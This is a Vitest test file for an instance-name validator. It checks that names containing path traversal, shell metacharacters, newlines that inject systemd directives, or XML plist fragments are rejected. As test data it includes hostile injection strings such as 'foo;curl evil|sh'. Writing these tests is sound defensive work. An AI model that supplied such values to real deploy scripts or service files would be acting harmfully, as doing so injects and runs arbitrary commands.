import { afterEach, describe, expect, it } from 'vitest';

import { isValidInstanceName, readInstanceName } from './instance-name.js';

describe('isValidInstanceName', () => {
  it.each([
    ['review', true],
    ['general', true],
    ['app-1', true],
    ['app_2', true],
    ['a', true],
    ['0', true],
    ['abcdefghij0123456789abcdefghij01', true], // 32 chars, max length
  ])('accepts %s → %s', (name, expected) => {
    expect(isValidInstanceName(name)).toBe(expected);
  });

  it.each([
    // empty / whitespace
    ['', false],
    [' ', false],
    [' review ', false],
    // leading non-alphanumeric — would let `-foo` parse as a flag downstream
    ['-foo', false],
    ['_foo', false],
    ['.foo', false],
    // path traversal
    ['..', false],
    ['../etc', false],
    ['a/b', false],
    ['a\\b', false],
    // shell metacharacters — would inject into the historical
    // `make deploy-${instance}` shell command and into ad-hoc logs.
    ['a;rm', false],
    ['a$(rm)', false],
    ['a`rm`', false],
    ['a|b', false],
    ['a&b', false],
    // XML metacharacters — would corrupt the launchd plist body.
    ['a<b', false],
    ['a>b', false],
    ['a"b', false],
    ["a'b", false],
    ['a&b', false],
    // whitespace / newline — would split systemd `Environment=` line.
    ['a b', false],
    ['a\tb', false],
    ['a\nb', false],
    // uppercase — keep names predictable across case-insensitive paths
    // (macOS HFS+, docker-compose project names).
    ['Review', false],
    ['REVIEW', false],
    // length
    ['abcdefghij0123456789abcdefghij012', false], // 33 chars
  ])('rejects %j', (name) => {
    expect(isValidInstanceName(name)).toBe(false);
  });
});

describe('readInstanceName', () => {
  const original = process.env.NCL_INSTANCE;
  afterEach(() => {
    if (original === undefined) delete process.env.NCL_INSTANCE;
    else process.env.NCL_INSTANCE = original;
  });

  it('returns empty string when env var is unset', () => {
    delete process.env.NCL_INSTANCE;
    expect(readInstanceName()).toBe('');
  });

  it('returns empty string for whitespace-only', () => {
    process.env.NCL_INSTANCE = '   ';
    expect(readInstanceName()).toBe('');
  });

  it('returns trimmed value when valid', () => {
    process.env.NCL_INSTANCE = '  review  ';
    expect(readInstanceName()).toBe('review');
  });

  it('throws on path-traversal attempt', () => {
    process.env.NCL_INSTANCE = '../etc';
    expect(() => readInstanceName()).toThrow(/Invalid NCL_INSTANCE/);
  });

  it('throws on shell-injection attempt (historical make deploy-${inst})', () => {
    process.env.NCL_INSTANCE = 'foo;curl evil|sh';
    expect(() => readInstanceName()).toThrow(/Invalid NCL_INSTANCE/);
  });

  it('throws on newline (would inject systemd unit directives)', () => {
    process.env.NCL_INSTANCE = 'foo\nExecStartPre=/usr/bin/whoami';
    expect(() => readInstanceName()).toThrow(/Invalid NCL_INSTANCE/);
  });

  it('throws on XML metachars (would corrupt launchd plist)', () => {
    process.env.NCL_INSTANCE = 'foo</string><key>evil</key>';
    expect(() => readInstanceName()).toThrow(/Invalid NCL_INSTANCE/);
  });
});
